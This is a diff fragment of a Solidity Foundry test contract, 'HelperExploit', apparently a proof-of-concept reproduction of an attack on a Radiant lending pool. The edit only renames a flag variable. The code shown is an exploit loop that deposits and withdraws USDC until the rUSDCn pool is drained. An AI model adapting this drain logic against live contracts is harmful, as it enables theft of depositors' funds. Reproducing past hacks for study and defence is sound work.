@@ -198,12 +198,12 @@ contract HelperExploit is Test {
     function siphonFundsFromPool(uint256 amount) external {
         USDC.transferFrom(msg.sender, address(this), amount << 1);
         USDC.approve(address(RadiantLendingPool), type(uint256).max);
-        bool depositDoubledAmount;
+        bool depositSingleAmount;
         while (true) {
             if (USDC.balanceOf(address(rUSDCn)) < 1) {
                 break;
             }
-            if (depositDoubledAmount == true) {
+            if (depositSingleAmount == true) {
                 RadiantLendingPool.deposit(
                     address(USDC),
                     amount,
@@ -217,7 +217,7 @@ contract HelperExploit is Test {
                     address(this),
                     0
                 );
-                depositDoubledAmount = true;
+                depositSingleAmount = true;
             }
             if (USDC.balanceOf(address(rUSDCn)) > ((amount * 3) >> 1) - 1) {
                 RadiantLendingPool.withdraw(
